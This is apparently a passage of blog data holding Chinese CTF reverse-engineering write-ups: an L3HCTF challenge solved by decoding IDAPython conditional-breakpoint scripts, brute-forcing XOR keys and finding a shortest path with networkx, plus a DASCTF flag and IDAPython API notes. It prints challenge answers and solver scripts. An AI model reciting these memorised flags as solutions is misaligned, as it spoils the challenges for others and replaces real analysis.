&#x27;0x40dc00&#x27;, &#x27;0x40db60&#x27;, &#x27;0x40dac0&#x27;, &#x27;0x40da20&#x27;, &#x27;0x40d980&#x27;, &#x27;0x40d8e0&#x27;, &#x27;0x40d840&#x27;, &#x27;0x40d7a0&#x27;, &#x27;0x40d700&#x27;, &#x27;0x40f9c0&#x27;, &#x27;0x40fe10&#x27;, &#x27;0x4116b0&#x27;, &#x27;0x412450&#x27;, &#x27;0x4131e0&#x27;, &#x27;0x413280&#x27;, &#x27;0x413320&#x27;, &#x27;0x4133c0&#x27;, &#x27;0x413460&#x27;, &#x27;0x4134f0&#x27;, &#x27;0x4124f0&#x27;, &#x27;0x411740&#x27;, &#x27;0x40fea0&#x27;, &#x27;0x40ff40&#x27;, &#x27;0x40ffe0&#x27;, &#x27;0x410080&#x27;, &#x27;0x410120&#x27;, &#x27;0x4117e0&#x27;, &#x27;0x412590&#x27;, &#x27;0x413590&#x27;, &#x27;0x4139d0&#x27;, &#x27;0x416820&#x27;, &#x27;0x416780&#x27;, &#x27;0x4166e0&#x27;, &#x27;0x416640&#x27;, &#x27;0x4165a0&#x27;, &#x27;0x416500&#x27;, &#x27;0x416460&#x27;, &#x27;0x4163c0&#x27;, &#x27;0x416320&#x27;, &#x27;0x416280&#x27;, &#x27;0x4168c0&#x27;, &#x27;0x419110&#x27;, &#x27;0x419370&#x27;, &#x27;0x419fb0&#x27;, &#x27;0x41a040&#x27;, &#x27;0x41a0e0&#x27;, &#x27;0x41a180&#x27;, &#x27;0x41a220&#x27;, &#x27;0x41a2c0&#x27;, &#x27;0x41a350&#x27;, &#x27;0x41a3f0&#x27;, &#x27;0x41a490&#x27;, &#x27;0x41a530&#x27;, &#x27;0x41a5d0&#x27;, &#x27;0x419410&#x27;, &#x27;0x4191b0&#x27;, &#x27;0x416960&#x27;, &#x27;0x416a00&#x27;, &#x27;0x416a90&#x27;, &#x27;0x416b20&#x27;, &#x27;0x416bc0&#x27;, &#x27;0x416c60&#x27;, &#x27;0x416d00&#x27;, &#x27;0x416da0&#x27;, &#x27;0x416e40&#x27;, &#x27;0x416ee0&#x27;, &#x27;0x416f80&#x27;, &#x27;0x417010&#x27;, &#x27;0x4170b0&#x27;, &#x27;0x417150&#x27;, &#x27;0x4171e0&#x27;, &#x27;0x417280&#x27;, &#x27;0x417320&#x27;, &#x27;0x4173c0&#x27;, &#x27;0x417460&#x27;, &#x27;0x417500&#x27;, &#x27;0x4175a0&#x27;, &#x27;0x417640&#x27;, &#x27;0x4176e0&#x27;, &#x27;0x417780&#x27;, &#x27;0x417820&#x27;, &#x27;0x4178c0&#x27;, &#x27;0x417960&#x27;, &#x27;0x417a00&#x27;, &#x27;0x417aa0&#x27;, &#x27;0x417b30&#x27;, &#x27;0x417bd0&#x27;, &#x27;0x417c70&#x27;, &#x27;0x417d10&#x27;, &#x27;0x417da0&#x27;, &#x27;0x417e30&#x27;, &#x27;0x417ec0&#x27;, &#x27;0x417f60&#x27;, &#x27;0x418000&#x27;, &#x27;0x4180a0&#x27;, &#x27;0x418140&#x27;, &#x27;0x4181e0&#x27;, &#x27;0x418280&#x27;, &#x27;0x418310&#x27;, &#x27;0x4183b0&#x27;, &#x27;0x418440&#x27;, &#x27;0x4184e0&#x27;, &#x27;0x418580&#x27;, &#x27;0x418610&#x27;, &#x27;0x4186b0&#x27;, &#x27;0x419250&#x27;, &#x27;0x4194b0&#x27;, &#x27;0x41be60&#x27;, &#x27;0x41bf90&#x27;, &#x27;0x41c8e0&#x27;, &#x27;0x41e1e0&#x27;, &#x27;0x41e140&#x27;, &#x27;0x41ea10&#x27;, &#x27;0x41ebf0&#x27;, &#x27;0x41f1e0&#x27;]dssddddddddddddddddddssssssssssdddddddddddddddddddddddddddddddwwwwwwaaaaaaaaassddddddssaaaaaaaaaaaaawwdddwwwwwddddddddddddddddddddddddddsssssssssssssssddddddddddddddddwwwwwwwwwwwwwaaaaaaawwwwddddddddddddssssssdsdsdsssasaasssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaasaaaaaaaaaaaaaaaaaaawwwwdddddddddddddddddddddsddddddddddddddwwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasssssdddddwwwddddsssssaaaaaaaaassssddddddddddwwwddddddddddddddddddddddddddddddddddddddddddddddddssssssassssDASCTF&#123;0a80fbe4b623aa3c09173ecf9147601e&#125; 对于networkx的学习，可以参考此文档 https://www.osgeo.cn/networkx/tutorial.html 对于求最短路径来说，基本就是 创建合适的图 添加节点，添加边 调用shortest_path，求出最短路径，这里求出的是经过的节点 然后再根据具体题目要求，根据经过的节点，把操作的步骤打印出来即可 IDAAAAAA分析此题为今年L3HCTF的一道re题，题目仅给了一个i64文件，没有给可执行文件，IDA打开分析 sub_401E97函数返回1，则正确, 进入此函数发现有5个方程，用z3解 发现无解 再次观察，发现这里有个断点，来到断点窗口 发现是个条件断点，将conditon的数据复制出来 12345678910111213141516global jIS40AjIS40A = [xxx, xxx, xxx。。。。] # 很长的密文 是个列表，长度是1000N4QKUt = 0EpUdLx = 4728923 # 0x048285B idaapi.add_bpt(EpUdLx) # 0x048285B uwGgnM = idaapi.bpt_t()idaapi.get_bpt(EpUdLx, uwGgnM)uwGgnM.elang = &quot;Python&quot; uwGgnM.condition = &quot;N4QKUt = &#123;&#125;\\n&quot;.format(N4QKUt) + &#x27;VLzxDy = idaapi.get_byte(5127584 + N4QKUt)\\nVLzxDy -= ord(\\&#x27;a\\&#x27;)\\nif VLzxDy == 0:\\n bYsMTa = 287\\n LjzrdT = b\\&#x27;lqAT7pNI3BX\\&#x27;\\nelif VLzxDy == 1:\\n bYsMTa = 96\\n LjzrdT = b\\&#x27;z3Uhis74aPq\\&#x27;\\nelif VLzxDy == 2:\\n bYsMTa = 8\\n LjzrdT = b\\&#x27;9tjseMGBHR5\\&#x27;\\nelif VLzxDy == 3:\\n bYsMTa = 777\\n LjzrdT = b\\&#x27;FhnvgMQjexH\\&#x27;\\nelif VLzxDy == 4:\\n bYsMTa = 496\\n LjzrdT = b\\&#x27;SKnZ51f9WsE\\&#x27;\\nelif VLzxDy == 5:\\n bYsMTa = 822\\n LjzrdT = b\\&#x27;gDJy104BSHW\\&#x27;\\nelif VLzxDy == 6:\\n bYsMTa = 914\\n LjzrdT = b\\&#x27;PbRV4rSM7fd\\&#x27;\\nelif VLzxDy == 7:\\n bYsMTa = 550\\n LjzrdT = b\\&#x27;WHPnoMTsbx3\\&#x27;\\nelif VLzxDy == 8:\\n bYsMTa = 273\\n LjzrdT = b\\&#x27;mLx5hvlqufG\\&#x27;\\nelif VLzxDy == 9:\\n bYsMTa = 259\\n LjzrdT = b\\&#x27;QvKgNmUFTnW\\&#x27;\\nelif VLzxDy == 10:\\n bYsMTa = 334\\n LjzrdT = b\\&#x27;TCrHaitRfY1\\&#x27;\\nelif VLzxDy == 11:\\n bYsMTa = 966\\n LjzrdT = b\\&#x27;m26IAvjq1zC\\&#x27;\\nelif VLzxDy == 12:\\n bYsMTa = 331\\n LjzrdT = b\\&#x27;dQb2ufTZwLX\\&#x27;\\nelif VLzxDy == 13:\\n bYsMTa = 680\\n LjzrdT = b\\&#x27;Y6Sr7znOeHL\\&#x27;\\nelif VLzxDy == 14:\\n bYsMTa = 374\\n LjzrdT = b\\&#x27;hLFj1wl5A0U\\&#x27;\\nelif VLzxDy == 15:\\n bYsMTa = 717\\n LjzrdT = b\\&#x27;H6W03R7TLFe\\&#x27;\\nelif VLzxDy == 16:\\n bYsMTa = 965\\n LjzrdT = b\\&#x27;fphoJwDKsTv\\&#x27;\\nelif VLzxDy == 17:\\n bYsMTa = 952\\n LjzrdT = b\\&#x27;CMF1Vk7NH4O\\&#x27;\\nelif VLzxDy == 18:\\n bYsMTa = 222\\n LjzrdT = b\\&#x27;43PSbAlgLqj\\&#x27;\\nelse:\\n bYsMTa = -1\\nif bYsMTa &lt; 0:\\n cpu.rsp -= 8\\n cpu.rdi = 4927649\\n cpu.rax = 0\\n idaapi.patch_qword(cpu.rsp, 4202616)\\n idaapi.del_bpt(cpu.rip)\\n cpu.rip = 4263680\\nelse:\\n zaqhdD = 0x486195\\n bYsMTa = jIS40A[bYsMTa]\\n\\n idaapi.patch_bytes(5117568, bYsMTa)\\n idaapi.patch_bytes(5117488, LjzrdT)\\n\\n cpu.rsp -= 8\\n idaapi.patch_qword(cpu.rsp, zaqhdD)\\n cpu.rdi = 5117568\\n cpu.rsi = len(bYsMTa)\\n cpu.rdx = 5117488\\n cpu.rcx = 11\\n cpu.r8 = 5117568\\n cpu.rax = 5117568\\n\\n idaapi.add_bpt(zaqhdD)\\n jQfwUA = idaapi.bpt_t()\\n idaapi.get_bpt(zaqhdD, jQfwUA)\\n jQfwUA.elang = &quot;Python&quot;\\n jQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\nSdjOr3 = &#123;&#125;\\\\n&quot;.format(N4QKUt, len(bYsMTa)) + \\&#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\\\nzaqhdD = 4767838\\\\nidaapi.add_bpt(zaqhdD)\\\\njQfwUA = idaapi.bpt_t()\\\\nidaapi.get_bpt(zaqhdD, jQfwUA)\\\\njQfwUA.elang = &quot;Python&quot;\\\\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\\\\\n&quot;.format(N4QKUt+1) + bYsMTa\\\\nidaapi.del_bpt(zaqhdD)\\\\nidaapi.add_bpt(jQfwUA)\\\\nidaapi.del_bpt(cpu.rip)\\\\ncpu.rsp -= 8\\\\nidaapi.patch_qword(cpu.rsp, zaqhdD)\\\\ncpu.rip = 4447160\\\\n\\&#x27;\\n idaapi.del_bpt(zaqhdD)\\n idaapi.add_bpt(jQfwUA)\\n idaapi.del_bpt(cpu.rip)\\n cpu.rip = 4201909\\n&#x27; idaapi.del_bpt(EpUdLx)idaapi.add_bpt(uwGgnM) # 改为条件断点cpu.rsp -= 8idaapi.patch_qword(cpu.rsp, EpUdLx) # 0x48285Bcpu.rip = 4202096 # retn --&gt;来到刚才条件断点的位置 可以发现，大致流程为，触发0x40201F处的断点的时候，设置一个新的条件断点，跳转过去，触发新的条件断点的condition，由此可见验证flag的算法全部在这些condition中 将uwGgnM.condition 稍作整理，然后分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596N4QKUt = 0VLzxDy = idaapi.get_byte(5127584 + N4QKUt) # 5127584(0x4e3da0) 为程序中输入的flag的地址 flag[N4QKUt]VLzxDy -= ord(&#x27;a&#x27;)if VLzxDy == 0: # 根据VLzxDy初始化2个值 bYsMTa = 287 # jIS40A的索引 LjzrdT = b&#x27;lqAT7pNI3BX&#x27; # 解密 jIS40A[bYsMTa] 的keyelif VLzxDy == 1: bYsMTa = 96 LjzrdT = b&#x27;z3Uhis74aPq&#x27;elif VLzxDy == 2: bYsMTa = 8 LjzrdT = b&#x27;9tjseMGBHR5&#x27;elif VLzxDy == 3: bYsMTa = 777 LjzrdT = b&#x27;FhnvgMQjexH&#x27;elif VLzxDy == 4: bYsMTa = 496 LjzrdT = b&#x27;SKnZ51f9WsE&#x27;elif VLzxDy == 5: bYsMTa = 822 LjzrdT = b&#x27;gDJy104BSHW&#x27;elif VLzxDy == 6: bYsMTa = 914 LjzrdT = b&#x27;PbRV4rSM7fd&#x27;elif VLzxDy == 7: bYsMTa = 550 LjzrdT = b&#x27;WHPnoMTsbx3&#x27;elif VLzxDy == 8: bYsMTa = 273 LjzrdT = b&#x27;mLx5hvlqufG&#x27;elif VLzxDy == 9: bYsMTa = 259 LjzrdT = b&#x27;QvKgNmUFTnW&#x27;elif VLzxDy == 10: bYsMTa = 334 LjzrdT = b&#x27;TCrHaitRfY1&#x27;elif VLzxDy == 11: bYsMTa = 966 LjzrdT = b&#x27;m26IAvjq1zC&#x27;elif VLzxDy == 12: bYsMTa = 331 LjzrdT = b&#x27;dQb2ufTZwLX&#x27;elif VLzxDy == 13: bYsMTa = 680 LjzrdT = b&#x27;Y6Sr7znOeHL&#x27;elif VLzxDy == 14: bYsMTa = 374 LjzrdT = b&#x27;hLFj1wl5A0U&#x27;elif VLzxDy == 15: bYsMTa = 717 LjzrdT = b&#x27;H6W03R7TLFe&#x27;elif VLzxDy == 16: bYsMTa = 965 LjzrdT = b&#x27;fphoJwDKsTv&#x27;elif VLzxDy == 17: bYsMTa = 952 LjzrdT = b&#x27;CMF1Vk7NH4O&#x27;elif VLzxDy == 18: bYsMTa = 222 LjzrdT = b&#x27;43PSbAlgLqj&#x27;else: bYsMTa = -1 if bYsMTa &lt; 0: # Wrong的位置 cpu.rsp -= 8 cpu.rdi = 4927649 # 0x4b30a1: &quot;O, no&quot; # 传递参数 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) # leave retn idaapi.del_bpt(cpu.rip) cpu.rip = 4263680 # 0410F00 printf(&quot;O, no&quot;)else: zaqhdD = 0x486195 bYsMTa = jIS40A[bYsMTa] # 从一长串密文中取出数据 idaapi.patch_bytes(5117568, bYsMTa) # 0x4e1680 # 取出的密文 idaapi.patch_bytes(5117488, LjzrdT) # 0x4e1630 # 取出的key # rdi, rsi, rdx, rcx, r8, r9 cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, zaqhdD) # 0x486195 # 设置参数 cpu.rdi = 5117568 # 0x4e1680 # 密文地址 cpu.rsi = len(bYsMTa) # 密文长度 cpu.rdx = 5117488 # 0x4e1630 # key地址 cpu.rcx = 11 # key长度 cpu.r8 = 5117568 # 0x4e1680 # 密文地址 cpu.rax = 5117568 # 0x4e1680 # 返回值 idaapi.add_bpt(zaqhdD) jQfwUA = idaapi.bpt_t() idaapi.get_bpt(zaqhdD, jQfwUA) jQfwUA.elang = &quot;Python&quot; jQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(bYsMTa)) + &#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nzaqhdD = 4767838\\nidaapi.add_bpt(zaqhdD)\\njQfwUA = idaapi.bpt_t()\\nidaapi.get_bpt(zaqhdD, jQfwUA)\\njQfwUA.elang = &quot;Python&quot;\\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + bYsMTa\\nidaapi.del_bpt(zaqhdD)\\nidaapi.add_bpt(jQfwUA)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, zaqhdD)\\ncpu.rip = 4447160\\n&#x27; idaapi.del_bpt(zaqhdD) idaapi.add_bpt(jQfwUA) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909 #0x401db5 # 5个参数 先执行解密，然后再-&gt;0x486195(因为上面已经把cpu.esp-8的位置改为了0x486195), 触发条件断点 可以发现流程就是，根据输入的flag的每个字符，来判断进入下一个节点解密函数是一个简单的异或, 先随便找几个解密看看，key的长度都是11 123456789def dec(_x, _key): m = [] for i in range(len(encs[_x])): m.append(encs[_x][i] ^ ord(_key[i % 11])) print(bytes(m).decode())dec(287, &#x27;lqAT7pNI3BX&#x27;)print(&#x27;===============================================================&#x27;)dec(96, &#x27;z3Uhis74aPq&#x27;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293NyPGpw = idaapi.get_byte(5127584 + N4QKUt)NyPGpw -= ord(&#x27;a&#x27;)if NyPGpw == 0: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif NyPGpw == 1: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif NyPGpw == 2: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;else: afvkwL = -1if afvkwL &lt; 0: cpu.rsp -= 8 cpu.rdi = 4927649 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) idaapi.del_bpt(cpu.rip) cpu.rip = 4263680else: RrNlIm = 0x4438d8 afvkwL = jIS40A[afvkwL] idaapi.patch_bytes(5117568, afvkwL) idaapi.patch_bytes(5117488, hsYnNw) cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, RrNlIm) cpu.rdi = 5117568 cpu.rsi = len(afvkwL) cpu.rdx = 5117488 cpu.rcx = 11 cpu.r8 = 5117568 cpu.rax = 5117568 idaapi.add_bpt(RrNlIm) XKDdOn = idaapi.bpt_t() idaapi.get_bpt(RrNlIm, XKDdOn) XKDdOn.elang = &quot;Python&quot; XKDdOn.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(afvkwL)) + &#x27;afvkwL = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nRrNlIm = 4370382\\nidaapi.add_bpt(RrNlIm)\\nXKDdOn = idaapi.bpt_t()\\nidaapi.get_bpt(RrNlIm, XKDdOn)\\nXKDdOn.elang = &quot;Python&quot;\\nXKDdOn.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + afvkwL\\nidaapi.del_bpt(RrNlIm)\\nidaapi.add_bpt(XKDdOn)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, RrNlIm)\\ncpu.rip = 4220940\\n&#x27; idaapi.del_bpt(RrNlIm) idaapi.add_bpt(XKDdOn) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909===============================================================XxrupR = idaapi.get_byte(5127584 + N4QKUt)XxrupR -= ord(&#x27;a&#x27;)if XxrupR == 0: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;elif XxrupR == 1: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;elif XxrupR == 2: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;else: SAoBHX = -1if SAoBHX &lt; 0: cpu.rsp -= 8 cpu.rdi = 4927649 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) idaapi.del_bpt(cpu.rip) cpu.rip = 4263680else: uBEeMD = 0x45e68a SAoBHX = jIS40A[SAoBHX] idaapi.patch_bytes(5117568, SAoBHX) idaapi.patch_bytes(5117488, EOlVWv) cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, uBEeMD) cpu.rdi = 5117568 cpu.rsi = len(SAoBHX) cpu.rdx = 5117488 cpu.rcx = 11 cpu.r8 = 5117568 cpu.rax = 5117568 idaapi.add_bpt(uBEeMD) piHsvj = idaapi.bpt_t() idaapi.get_bpt(uBEeMD, piHsvj) piHsvj.elang = &quot;Python&quot; piHsvj.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(SAoBHX)) + &#x27;SAoBHX = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nuBEeMD = 4808702\\nidaapi.add_bpt(uBEeMD)\\npiHsvj = idaapi.bpt_t()\\nidaapi.get_bpt(uBEeMD, piHsvj)\\npiHsvj.elang = &quot;Python&quot;\\npiHsvj.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + SAoBHX\\nidaapi.del_bpt(uBEeMD)\\nidaapi.add_bpt(piHsvj)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, uBEeMD)\\ncpu.rip = 4405922\\n&#x27; idaapi.del_bpt(uBEeMD) idaapi.add_bpt(piHsvj) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909 可以发现都符合一个框架 12345678910111213xxxx = idaapi.get_byte(5127584 + N4QKUt)xxxx -= ord(&#x27;a&#x27;)if xxxx == 0: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif xxxx == 1: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27; .......else: afvkwL = -1if afvkwL &lt; 0: ........ 因为解密出来都含有idaapi.get_byte(5127584 + N4QKUt)，而key的长度都是11，因此可以对key全部爆破出来 123456789101112131415encs = [....] def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None # i = 426 return keyskeys = get_keys()print(keys.count(None)) # 1 只有1个节点没有解密成功，即没有指向，应该就是终点，结合题目，是个最短路径问题 终点的索引是426，写脚本找到索引426的key 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def dec(_src, _key): m = [] for i in range(len(_src)): m.append(_src[i] ^ _key[i % 11]) return bytes(m).decode(&quot;utf-8&quot;)def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None return keysdef get_node_edges(_dec_src): # 获取每条边，2个点即构成一条边 # 传入解密后的脚本 i = _dec_src.index(&#x27;&lt;&#x27;) _dec_src = _dec_src[:i] m = re.findall(r&#x27; = (\\d+)&#x27;, _dec_src) nodes = [int(i) for i in m] return nodes keys = get_keys()for i, value in enumerate(encs): if keys[i] == None: target_node = i else: dec_src = dec(value, keys[i]) nodes = get_node_edges(dec_src) # 添加边 for j in range(len(nodes)): if nodes[j]==426: print(i) print(dec_src) exit()# 705# GKjYbv = idaapi.get_byte(5127584 + N4QKUt)# GKjYbv -= ord(&#x27;a&#x27;)# if GKjYbv == 0:# NizaZl = 426# BCTfiu = b&#x27;akUx3IWl29V&#x27;# else:# ...... key为akUx3IWl29V, 解密得到 123idaapi.del_bpt(cpu.rip)cpu.rax = 0cpu.rip = 4202594 # 0x402062 是终点无疑了，现在需要找出所有的节点，以及边（2个节点就是1个边，有方向）,然后用networkx求解 networkx求最短路径直接贴脚本了，就是通过正则表达式匹配出node,然后构造边，添加边，用networkx求出路径，再写出控制方向的的flag字符即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import reimport networkximport hashlibencs = [....] def dec(_src, _key): m = [] for i in range(len(_src)): m.append(_src[i] ^ _key[i % 11]) return bytes(m).decode(&quot;utf-8&quot;)def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None return keysdef get_node_edges(_dec_src): # 获取每个节点指向的其他的节点，然后通过此来获取边 # 传入解密后的脚本 i = _dec_src.index(&#x27;&lt;&#x27;) _dec_src = _dec_src[:i] m = re.findall(r&#x27; = (\\d+)&#x27;, _dec_src) nodes = [int(i) for i in m] return nodes keys = get_keys()edges = []node2node = []for i, value in enumerate(encs): if keys[i] == None: target_node = i # 终点 nodes = [] else: dec_src = dec(value, keys[i]) nodes = get_node_edges(dec_src) # 添加边 for j in range(len(nodes)): # 根据获取的指向的节点来添加边 edges.append([i, nodes[j]]) node2node.append(nodes)src_node = -1 # 最开始还有1个节点src_edge = [287, 96, 8, 777, 496, 822, 914, 550, 273, 259, 334, 966, 331, 680, 374, 717, 965, 952, 222]# 将最初的边添加进去for i in src_edge: edges.append([src_node, i])G = networkx.DiGraph()G.add_node(-1)for i in range(len(encs)): G.add_node(i)for i in edges: G.add_edge(i[0], i[1])path = networkx.shortest_path(G, source=src_node, target=target_node)print(path) # 打印出路径来s = []s.append(src_edge.index(path[1]))for i in range(2, len(path)): s.append(node2node[path[i-1]].index(path[i]))print(s)s = &quot;&quot;.join([chr(ord(&#x27;a&#x27;) + i) for i in s])print(s)print(&quot;L3HCTF&#123;&quot; + hashlib.md5(s.encode()).hexdigest() + &quot;&#125;&quot;)# [-1, 331, 578, 255, 875, 765, 687, 209, 119, 963, 939, 443, 250, 366, 65, 504, 920, 849, 720, 893, 728, 580, 114, 665, 72, 51, 241, 519, 473, 970, 984, 557, 90, 793, 487, 67, 428, 236, 263, 24, 39, 104, 505, 491, 95, 223, 486, 798, 873, 872, 64, 229, 37, 274, 329, 601, 372, 750, 446, 3, 332, 698, 277, 740, 816, 845, 570, 828, 21, 36, 839, 770, 343, 451, 151, 994, 937, 760, 644, 9, 614, 302, 454, 153, 840, 76, 424, 352, 950, 238, 613, 497, 898, 858, 415, 205, 393, 927, 522, 705, 426]# [12, 2, 0, 4, 1, 0, 2, 4, 3, 0, 0, 1, 5, 0, 2, 0, 2, 0, 1, 6, 0, 6, 1, 1, 0, 0, 4, 0, 2, 0, 1, 2, 1, 0, 2, 4, 1, 0, 6, 0, 0, 0, 1, 2, 3, 1, 6, 1, 3, 1, 2, 1, 3, 0, 2, 6, 0, 1, # 5, 1, 1, 4, 1, 0, 1, 0, 1, 1, 1, 1, 1, 2, 0, 0, 1, 3, 0, 1, 0, 1, 0, 5, 0, 2, 2, 0, 2, 3, 0, 6, 3, 0, 0, 1, 0, 1, 0, 0, 0, 0]# mcaebacedaabfacacabgagbbaaeacabcbacebagaaabcdbgbdbcbdacgabfbbebababbbbbcaabdababafaccacdagdaababaaaa# L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125; flag为 L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125; 参考： https://www.anquanke.com/post/id/259494#h3-2","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"图","slug":"图","permalink":"https://zzzzsky.github.io/tags/%E5%9B%BE/"},{"name":"最短路径","slug":"最短路径","permalink":"https://zzzzsky.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"}]},{"title":"IDAPython 学习笔记","slug":"LearnIDAPython","date":"2021-12-08T14:12:00.000Z","updated":"2021-12-08T14:22:07.588Z","comments":true,"path":"2021/12/08/LearnIDAPython/","link":"","permalink":"https://zzzzsky.github.io/2021/12/08/LearnIDAPython/","excerpt":"","text":"摘要比着大佬写的文章系统的学习下IDAPython，做下笔记，供自己以后查询 大佬的文章，👇 https://www.cnblogs.com/iBinary/p/14642662.htmlhttps://www.cnblogs.com/iBinary/p/14672540.htmlhttps://www.cnblogs.com/iBinary/p/14801928.html IDAPython参考学习文档 IDAPython官方函数文档： https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/ IDA版本变化后IDAPython对应差异函数查询：https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml IDA中获取界面中地址函数 作用 老版函数 新版函数 获取当前指令地址（光标点击的那个，灰色阴影那行） idc.ScreenEA() idc.get_screen_ea() 整个IDA中的最小地址 idc.MinEA() idc.StartEA() idc.BeginEA() ida_ida.inf_get_min_ea() 整个IDA中的最大地址（其实是最大地址 + 1） idc.MaxEA() ida_ida.inf_get_max_ea() 光标选择块的开始地址 idc.SelStart() idc.read_selection_start() 光标选择块的结束地址（结束地址 + 1） idc.SelEnd() idc.read_selection_end() 数值获取及打补丁操作获取数据在IDA中想要获取某个地址处的数据可以采用以下函数 作用 老版函数 新版函数 获取BYTES类型 ida_bytes.get_many_bytes(addr, len) ida_bytes.get_bytes(addr, len) 获取BYTE类型 idc.Byte(addr) idc.get_wide_byte(addr) 获取WORD类型 idc.Word(addr) idc.get_wide_word(addr) 获取DWORD类型 idc.Dword(addr) idc.get_wide_dword(addr) 获取QWORD类型 idc.Qword(addr) idc.get_qword(addr) Patch打补丁 作用 老版函数 新版函数 打补丁BYTE idc.PatchByte(addr,value) ida_bytes.patch_byte(addr,value) 打补丁WORD idc.PatchWord(addr,value) ida_bytes.patch_word(addr,value) 打补丁DWORD idc.PatchDword(addr,value) ida_bytes.patch_dword(addr,value) 打补丁QWORD idc.PatchQword(addr,value) ida_bytes.patch_qword(addr,value) 汇编相关指令操作 作用 老版函数 新版函数 获取地址处的汇编语句 idc.GetDisasm(addr) 无 更高级的获取.带有标志. 一般是给一个0 idc.GetDisasmEx(addr,flags) idc.generate_disasm_line(addr,flags) 获取指定位置的操作数mov ebp, esp. ebp索引是0，esp索引是1 idc.GetOpnd(addr,index) idc.print_operand(addr,index) 获取地址处汇编指令的操作指令 mov ebp,esp 获取mov idc.GetMnem(addr) idc.print_insn_mnem(addr) 获取基地址 idaapi.get_imagebase() 无 获取操作数的类型 idc.GetOpType(ea,index) idc.get_operand_type(addr,index) call printf； 调用此函数，index填0的话，返回的就是printf的地址。 and esp, 0FFFFFFF8h；index填1的话，返回的就是0xfffffff8 idc.GetOperandValue(addr,index) get_operand_value(addr,index) 获取下一行汇编的地址 idc.NextHead idc.next_head(ea) 获取上一行汇编的地址 idc.PrevHead idc.PrevHead(ea) 段相关操作 作用 老版函数 新版函数 获取段的名字 idc.SegName(addr) idc.get_segm_name(addr) 获取段的开始地址 idc.SegStart(addr) idc.get_segm_start(addr) 获取段的结束地址 idc.SegEnd(addr) idc.get_segm_end(addr) 返回一个列表记录所有段的地址 